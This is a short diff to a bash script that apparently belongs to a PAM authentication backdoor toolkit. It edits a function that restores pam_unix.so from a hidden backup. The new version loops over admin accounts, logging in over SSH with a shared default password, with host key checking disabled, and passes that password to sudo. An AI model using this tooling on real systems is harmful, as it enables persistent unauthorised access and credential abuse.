@@ -100,12 +100,15 @@ print_unbackdoored_IPs() {
 }
 
 remove_backdoor() {
-    sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@127.0.0.1" "
-        echo \"$default_password\" | sudo -S cp $path_to_pam/.pam_unix.so.bak $path_to_pam/pam_unix.so
-    "
-    if [[ $? -eq 0 ]]; then
-        echo "Backdoor successfully removed at 127.0.0.1"
-    fi
+    for admin in "${admins[@]}"; do
+        sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@127.0.0.1" "
+            echo \"$default_password\" | sudo -S cp $path_to_pam/.pam_unix.so.bak $path_to_pam/pam_unix.so
+        "
+        if [[ $? -eq 0 ]]; then
+            echo "Backdoor successfully removed at 127.0.0.1"
+            break
+        fi
+    done
 }
 
 main() {
